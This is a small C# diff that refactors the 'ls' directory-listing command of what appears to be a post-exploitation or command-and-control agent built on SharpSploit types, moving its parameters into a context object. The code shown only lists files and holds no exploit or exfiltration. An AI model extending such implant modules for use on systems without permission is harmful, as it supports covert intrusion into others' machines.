@@ -11,7 +11,7 @@ namespace Agent.Commands
     public class ListirectoryCommand : AgentCommand
     {
         public override string Name => "ls";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             var results = new SharpSploitResultList<ListDirectoryResult>();
 
@@ -52,7 +52,7 @@ namespace Agent.Commands
 
 
             results.AddRange(list.OrderBy(f => f.IsFile).ThenBy(f => f.Name));
-            result.Result = results.ToString();
+            context.Result.Result = results.ToString();
         }
 
         public sealed class ListDirectoryResult : SharpSploitResult
